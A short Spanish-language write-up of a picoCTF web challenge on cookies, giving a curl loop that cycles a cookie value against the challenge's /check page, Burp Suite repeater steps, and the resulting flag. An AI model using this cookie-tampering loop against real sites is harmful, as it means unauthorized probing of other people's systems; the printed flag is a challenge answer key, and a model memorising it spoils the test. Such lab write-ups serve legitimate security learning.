# Level X
## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

## Datos de Acceso al Nivel
```
```
## Solucion
```Bash
abrir url
colocar un tipo de galleta
abrir cookie-editor y revisar el nombre de la cookie
abrir terminal
curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=1" | grep "I love"
for i in {0..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i" ; done | grep pico
copiar flag
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}

Con proxy-burpsuit
Abrir burpsuit
crear proyecto temporal
usar configuracion por default
abrir pestania Proxy
cambiar configuracion de firefox
configuracion de red
agregar la ip y puerto del proxy del burpsuit
verificar el flujo de informacion
activar el burp
probar con alguna galleta valida
tomar la peticion de /check y enviar al repeter
modificar la cookie hasta encontrar en response la flag
copiar flag
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}

Python

```
## Notas Adicionales
|**Comandos**|**Descripcion**|
|--------|-------------|
|||
|||
## Referencias

